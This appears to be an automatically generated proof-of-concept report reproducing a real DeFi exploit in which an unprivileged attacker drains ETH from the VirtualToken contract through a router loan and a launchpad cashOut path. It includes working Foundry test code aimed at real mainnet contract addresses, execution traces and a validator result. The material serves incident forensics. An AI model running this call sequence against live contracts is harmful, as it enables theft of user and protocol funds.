# VirtualToken Launchpad Loan/Router Debt Exploit – Forge PoC Report

## 1. Overview & Context

This PoC reproduces the VirtualToken loan/debt and launchpad `cashOut` exploit that drained ETH from `VirtualToken` into LamboToken/VirtualToken Uniswap V2 pools and ultimately to an adversary, as described in the root cause analysis for block 21184770 on Ethereum mainnet.  
Instead of replaying the original attacker EOA and helper contract, the PoC uses a fresh attacker address on a forked mainnet state to exercise the same vulnerable interaction between:
- `VirtualToken` at `0x280A8955A11FcD81D72bA1F99d265A48ce39aC2E`,
- the launchpad at `0x19C5538DF65075d53D6299904636baE68b6dF441`,
- the router at `0x62f250CF7021e1CF76C765deC8EC623FE173a1b5`, and
- LamboToken/VirtualToken pools `0x0634…`, `0x582d…`, and `0xda17…`.

The goal of the PoC is to:
- prove that an unprivileged adversary can increase VirtualToken’s pool debt via the router,
- have the launchpad unwrap VirtualToken into ETH using `cashOut`, and
- realize net ETH profit for the attacker while VirtualToken’s ETH balance decreases.

**Command to run the PoC**

```bash
cd forge_poc
RPC_URL="<your_mainnet_rpc_url>" forge test --via-ir -vvvvv
```

Use an Ethereum mainnet RPC endpoint with historical access to block `21184770`. The PoC reads `RPC_URL` at runtime via `vm.envString("RPC_URL")` and uses `vm.createSelectFork` to create a mainnet fork.

---

## 2. PoC Architecture & Key Contracts

The PoC is implemented as a Foundry test contract `ExploitTest` in `forge_poc/test/Exploit.t.sol`. Key elements:

- **Adversary role**
  - A fresh EOA `attacker` created via `makeAddr("attacker")`.
  - No reuse of the original incident EOA or helper contract; the test itself orchestrates calls to the router and launchpad.

- **Protocol contracts (mainnet addresses)**
  - `VIRTUAL_TOKEN_ADDR`: `0x280A8955A11FcD81D72bA1F99d265A48ce39aC2E`
  - `LAUNCHPAD_ADDR`: `0x19C5538DF65075d53D6299904636baE68b6dF441`
  - `ROUTER_ADDR`: `0x62f250CF7021e1CF76C765deC8EC623FE173a1b5`
  - `POOL_1_ADDR`: `0x0634866dfd8F05019c2A6e1773dC64Cb5a5D3E6c` (Lambo1/VirtualToken)
  - `POOL_2_ADDR`: `0x582d17d24127cFDCBC8c4e0A40C12D77B2E7a48D`
  - `POOL_3_ADDR`: `0xda173E4212aE2477274621248bD15cC8455044cA`
  - Lambo tokens `LAMBO1_ADDR`, `LAMBO2_ADDR`, `LAMBO3_ADDR` match the incident tokens.

- **Main test contract setup**

From the PoC test contract:

```solidity
contract ExploitTest is Test {
    address constant VIRTUAL_TOKEN_ADDR = 0x280A8955A11FcD81D72bA1F99d265A48ce39aC2E;
    address constant LAUNCHPAD_ADDR    = 0x19C5538DF65075d53D6299904636baE68b6dF441;
    address constant ROUTER_ADDR       = 0x62f250CF7021e1CF76C765deC8EC623FE173a1b5;

    address constant POOL_1_ADDR = 0x0634866dfd8F05019c2A6e1773dC64Cb5a5D3E6c;
    address constant POOL_2_ADDR = 0x582d17d24127cFDCBC8c4e0A40C12D77B2E7a48D;
    address constant POOL_3_ADDR = 0xDa173E4212aE2477274621248bD15cC8455044cA;

    IVirtualToken public virtualToken = IVirtualToken(VIRTUAL_TOKEN_ADDR);
    IERC20 public lambo1 = IERC20(LAMBO1_ADDR);
    ...
}
```

*Snippet: Core protocol addresses and interfaces used by the PoC test.*

- **Environment bootstrapping**
  - `setUp()` forks Ethereum mainnet at block `21184770`.
  - It labels all key protocol contracts for trace readability.
  - It performs all oracle pre-checks to confirm the environment matches the incident assumptions.

```solidity
function setUp() public {
    string memory rpcUrl = vm.envString("RPC_URL");
    vm.createSelectFork(rpcUrl, 21_184_770);

    attacker = makeAddr("attacker");
    target_pool = POOL_1_ADDR;

    vm.label(VIRTUAL_TOKEN_ADDR, "VirtualToken");
    vm.label(LAUNCHPAD_ADDR, "Launchpad");
    vm.label(ROUTER_ADDR, "Router");
    vm.label(POOL_1_ADDR, "Pool1");
    ...

    // Oracle pre-checks.
    assertGt(VIRTUAL_TOKEN_ADDR.code.length, 0);
    assertTrue(virtualToken.whiteList(LAUNCHPAD_ADDR));
    assertTrue(virtualToken.validFactories(ROUTER_ADDR));
    assertGt(VIRTUAL_TOKEN_ADDR.balance, 0);
}
```

*Snippet: Mainnet fork, labeling, and oracle pre-checks in `setUp()`.*

---

## 3. Adversary Execution Flow

The core exploit logic is encapsulated in `reproducerAttack()` and driven by the `testExploit()` test. The sequence mirrors the high-level incident flow:

1. **Environment & attacker funding**
   - The test runs on a fork of mainnet at block `21184770`.
   - A fresh attacker EOA is created.
   - The attacker is funded with a large `Lambo1` balance via `deal(LAMBO1_ADDR, attacker, attackerLamboBalance)` to emulate the helper contract’s holdings in the incident.

2. **Virtual liquidity and loan/debt creation**
   - The attacker approves the router and launchpad to spend `Lambo1`.
   - The attacker calls `router.addVirtualLiquidity(VirtualToken, Lambo1, 300 ether, 0)`.
   - Internally, the router calls `VirtualToken.takeLoan(pool1, 300 ether)`, which:
     - mints 300 VT into `POOL_1_ADDR`, and
     - increases `VirtualToken._debt[POOL_1_ADDR]` by 300 ether.

3. **Launchpad sell path and `cashOut`**
   - The attacker calls `launchpad.sellQuote(LAMBO1, lamboSellAmount, 0)`.
   - This sends Lambo1 into the Lambo1/VirtualToken pool, trades against the VT liquidity, and routes VirtualToken back to the launchpad.
   - The launchpad then calls `VirtualToken.cashOut` using its VT balance, unwrapping into ETH sent from VirtualToken’s treasury to the launchpad and then to the attacker.

4. **Profit realization**
   - The test measures attacker ETH balance before and after the sequence, asserting a strict increase.
   - It also asserts that VirtualToken’s own ETH balance strictly decreases.

Key part of the exploit sequence:

```solidity
function reproducerAttack() internal {
    uint256 lamboSellAmount = 3_000_000_000_000_000_000_000_000;
    uint256 attackerLamboBalance = 30_000_000 ether;

    vm.startPrank(attacker);
    deal(LAMBO1_ADDR, attacker, attackerLamboBalance);

    lambo1.approve(ROUTER_ADDR, type(uint256).max);
    lambo1.approve(LAUNCHPAD_ADDR, type(uint256).max);

    uint256 loanAmount = 300 ether;
    (bool ok1, ) = ROUTER_ADDR.call(
        abi.encodeWithSignature(
            "addVirtualLiquidity(address,address,uint256,uint256)",
            VIRTUAL_TOKEN_ADDR,
            LAMBO1_ADDR,
            loanAmount,
            0
        )
    );
    require(ok1, "router.addVirtualLiquidity failed");

    (bool ok2, ) = LAUNCHPAD_ADDR.call(
        abi.encodeWithSignature(
            "sellQuote(address,uint256,uint256)",
            LAMBO1_ADDR,
            lamboSellAmount,
            0
        )
    );
    require(ok2, "launchpad.sellQuote failed");

    vm.stopPrank();
}
```

*Snippet: End-to-end exploit flow from a clean attacker address, driving router and launchpad interactions.*

The trace from the validator run confirms the key steps occur on-chain on the fork:

```text
Router::addVirtualLiquidity(VirtualToken, Lambo1, 300e18, 0)
  VirtualToken::takeLoan(Pool1, 300e18)
  UniswapV2Pair::mint(...)
Launchpad::sellQuote(Lambo1, 3e24, 0)
  Lambo1::transferFrom(attacker, Launchpad, 3e24)
  Lambo1::transfer(Pool1, 3e24)
  UniswapV2Pair::swap(..., Launchpad, ...)
    VirtualToken::transfer(Launchpad, ...)
  VirtualToken::cashOut(...)
```

*Snippet: Extract from Forge `-vvvvv` trace showing `takeLoan`, pool minting, and launchpad-initiated `cashOut`.*

---

## 4. Oracle Definitions and Checks

The PoC is explicitly aligned with the oracle specification in `oracle_definition.json`. The oracles fall into variables, pre-checks, hard constraints, and soft constraints.

### 4.1 Variables

- **`virtual_token`** – VirtualToken contract exploited (`VIRTUAL_TOKEN_ADDR`).
- **`launchpad`** – Whitelisted launchpad that can call `cashIn`/`cashOut` (`LAUNCHPAD_ADDR`).
- **`router`** – Valid factory that can call `takeLoan` (`ROUTER_ADDR`).
- **`pool_1`, `pool_2`, `pool_3`** – Lambo/VT pools; `target_pool` in the PoC is set to `POOL_1_ADDR`.
- **`lambo_token_1`, `lambo_token_2`, `lambo_token_3`** – Lambo tokens backing each pool.
- **`attacker`** – Clean EOA created in the test.
- **`profit_asset_eth`** – ETH as the profit asset.

The contract constants and state variables in `ExploitTest` mirror these variables and serve as the binding between the oracle definition and the PoC.

### 4.2 Pre-checks

The oracle pre-checks require:
1. VirtualToken code exists at the expected address.
2. The launchpad is whitelisted in VirtualToken.
3. The router is registered as a valid factory.
4. VirtualToken holds some ETH before the exploit.

These are all enforced in `setUp()`:

```solidity
// 1. VirtualToken code must exist at the expected address.
assertGt(VIRTUAL_TOKEN_ADDR.code.length, 0);

// 2. Launchpad must be whitelisted.
assertTrue(virtualToken.whiteList(LAUNCHPAD_ADDR));

// 3. Router must be a valid factory.
assertTrue(virtualToken.validFactories(ROUTER_ADDR));

// 4. VirtualToken must hold some ETH before the exploit.
assertGt(VIRTUAL_TOKEN_ADDR.balance, 0);
```

*Snippet: Pre-checks mapping directly to oracle preconditions.*

### 4.3 Hard constraints

**Hard 1 – Debt increase on target pool**
- Oracle requirement: `VirtualToken._debt[target_pool]` must strictly increase during the exploit, reflecting a loan-backed virtual liquidity position.
- PoC implementation: `testExploit()` records `debtBefore` and `debtAfter` on `target_pool = POOL_1_ADDR` and asserts `debtAfter > debtBefore`.

**Hard 2 – `cashOut` called by launchpad**
- Oracle requirement: At least one `VirtualToken.cashOut` call must succeed, initiated by the whitelisted launchpad.
- PoC implementation: The test records logs around `reproducerAttack()` and scans for the `Unwrap(address,uint256)` event emitted by `VirtualToken` with `user == LAUNCHPAD_ADDR`.

```solidity
function testExploit() public {
    uint256 debtBefore = virtualToken._debt(target_pool);
    uint256 attackerBalanceBefore = attacker.balance;
    uint256 vtBalanceBefore = VIRTUAL_TOKEN_ADDR.balance;

    vm.recordLogs();
    reproducerAttack();

    uint256 debtAfter = virtualToken._debt(target_pool);
    uint256 attackerBalanceAfter = attacker.balance;
    uint256 vtBalanceAfter = VIRTUAL_TOKEN_ADDR.balance;
    Vm.Log[] memory logs = vm.getRecordedLogs();

    assertGt(debtAfter, debtBefore);
    assertGt(attackerBalanceAfter, attackerBalanceBefore);
    assertLt(vtBalanceAfter, vtBalanceBefore);

    bytes32 unwrapSig = keccak256("Unwrap(address,uint256)");
    bool sawLaunchpadCashOut = false;
    for (uint256 i = 0; i < logs.length; i++) {
        Vm.Log memory log = logs[i];
        if (log.emitter != VIRTUAL_TOKEN_ADDR) continue;
        if (log.topics.length == 0 || log.topics[0] != unwrapSig) continue;
        (address user, uint256 amount) = abi.decode(log.data, (address, uint256));
        if (user == LAUNCHPAD_ADDR) {
            sawLaunchpadCashOut = true;
            break;
        }
    }
    assertTrue(sawLaunchpadCashOut);
}
```

*Snippet: Hard and soft oracle enforcement in `testExploit()`, including log-based detection of launchpad-initiated `cashOut`.*

### 4.4 Soft constraints

**Soft 1 – Attacker ETH profit**
- Oracle: Attacker EOA must end with strictly more ETH than before, demonstrating a profitable opportunity in ETH.
- PoC: `attacker.balance` is recorded before and after `reproducerAttack()`; the test asserts `attackerBalanceAfter > attackerBalanceBefore`.

**Soft 2 – VirtualToken ETH depletion**
- Oracle: VirtualToken’s ETH balance must strictly decrease across the exploit, indicating actual treasury loss.
- PoC: `VIRTUAL_TOKEN_ADDR.balance` is recorded before and after; the test asserts `vtBalanceAfter < vtBalanceBefore`.

All listed oracles are implemented in the PoC, possibly with minor differences in expression (e.g., using log inspection instead of `vm.expectCall`), but faithfully capturing the intended conditions.

---

## 5. Validation Result and Robustness

The validator executed the PoC using the prescribed command with `-vvvvv` tracing and recorded logs to:

```text
/home/wesley/TxRayExperiment/incident-202601031751/artifacts/poc/poc_validator/forge-test.log
```

The `poc_validated_result.json` produced by the validator is:

```json
{
  "overall_status": "Pass",
  "poc_correctness_checks": {
    "passes_validation_oracles": { "passed": true, "reason": "..." }
  },
  "poc_quality_checks": {
    "oracle_alignment_with_definition": { "passed": true, "reason": "..." },
    "human_readable_and_labeled": { "passed": true, "reason": "..." },
    "no_magic_numbers_and_values_are_derived": { "passed": true, "reason": "..." },
    "mainnet_fork_no_local_mocks": { "passed": true, "reason": "..." },
    "self_contained_no_attacker_side_artifacts": {
      "no_attacker_eoa_addresses": { "passed": true, "reason": "..." },
      "no_attacker_deployed_contract_addresses": { "passed": true, "reason": "..." },
      "no_attacker_artifacts_or_calldata": { "passed": true, "reason": "..." }
    },
    "end_to_end_attack_process_described": { "passed": true, "reason": "..." },
    "alignment_with_root_cause": { "passed": true, "reason": "..." }
  },
  "artifacts": {
    "validator_test_log_path": "/home/wesley/TxRayExperiment/incident-202601031751/artifacts/poc/poc_validator/forge-test.log"
  },
  "hints": []
}
```

*Snippet: Structured validation result indicating a full Pass on correctness and quality checks.*

Interpretation:
- **Overall status: Pass** – The PoC compiles and runs successfully on a mainnet fork and satisfies all validation oracles.
- **Correctness** – All pre-checks, hard constraints, and soft constraints from `oracle_definition.json` are enforced and pass.
- **Quality** – The PoC:
  - aligns closely with the oracle specification,
  - is human-readable and well-labeled,
  - uses clearly motivated parameters (block number, 300 ether loan cap, incident-scale token amounts),
  - is self-contained with respect to attacker identities, and
  - uses a forked mainnet state without mocking core protocol components.

---

## 6. Linking PoC Behavior to Root Cause

The root cause analysis identifies a design flaw in VirtualToken’s loan/debt accounting when combined with the router’s `addVirtualLiquidity` and the launchpad’s `cashIn`/`cashOut` flows:

- The router, as a valid factory, can call `VirtualToken.takeLoan(pool, amount)` to mint VT into pools and increase `_debt[pool]`.
- The launchpad, as a whitelisted caller, can call `VirtualToken.cashOut(amount)` using VT balances sourced from those pools.
- The `cashOut` logic burns VT from the launchpad and sends ETH from VirtualToken’s treasury, but `_debt` remains on the pools, leaving them under-collateralized.
- Over repeated cycles, ETH is transferred from VirtualToken to the adversary while the pools’ `_debt` grows and is never reconciled.

The PoC directly exercises this flawed pathway:

- **Debt creation via router**
  - `reproducerAttack()` calls `router.addVirtualLiquidity(VirtualToken, Lambo1, 300 ether, 0)`, which matches the incident pattern of 300 ether loans and increases `_debt[POOL_1_ADDR]`.
  - `testExploit()` verifies that `virtualToken._debt(target_pool)` increases, confirming the pool-side debt growth described in the root cause report.

- **Launchpad-driven `cashOut` and ETH drain**
  - `reproducerAttack()` then calls `launchpad.sellQuote(Lambo1, lamboSellAmount, 0)`, routing Lambo1 through the Lambo1/VT pool and accumulating VT at the launchpad.
  - The launchpad calls `VirtualToken.cashOut` using the acquired VT, unwrapping to ETH funded from VirtualToken’s treasury.
  - Log inspection in `testExploit()` confirms an `Unwrap(address,uint256)` event with `user == LAUNCHPAD_ADDR`, tying the ETH outflow to the whitelisted launchpad.
  - The test asserts that VirtualToken’s ETH balance decreases and the attacker’s ETH balance increases, matching the ACT success predicate of positive ETH profit at the expense of VirtualToken.

- **ACT framing and roles**
  - **Adversary-crafted steps**: The calls made by the `attacker` EOA in the test (router `addVirtualLiquidity`, launchpad `sellQuote`) correspond to the original attacker’s interactions via the helper contract.
  - **Victim-observed behavior**: VirtualToken and the pools observe increases in `_debt` and ETH outflows through `cashOut`, matching the victim-side state changes in the incident traces.
  - **Success predicate**: The PoC enforces and demonstrates that the attacker’s net ETH balance strictly increases while VirtualToken’s ETH balance strictly decreases, realizing the same exploit predicate as the documented incident, albeit in a simplified single-transaction form.

In summary, the PoC:
- runs on a forked Ethereum mainnet state at the correct pre-incident block,
- uses the real VirtualToken, launchpad, router, Lambo tokens, and pools,
- reproduces the critical loan/debt and `cashOut` interaction that enables ETH extraction, and
- passes all specified oracles and quality checks without relying on original attacker identities or artifacts.

This provides strong, evidence-backed confirmation that the PoC faithfully captures the root cause of the VirtualToken Launchpad Loan/Router Debt exploit and demonstrates a practical ACT opportunity for an unprivileged adversary.

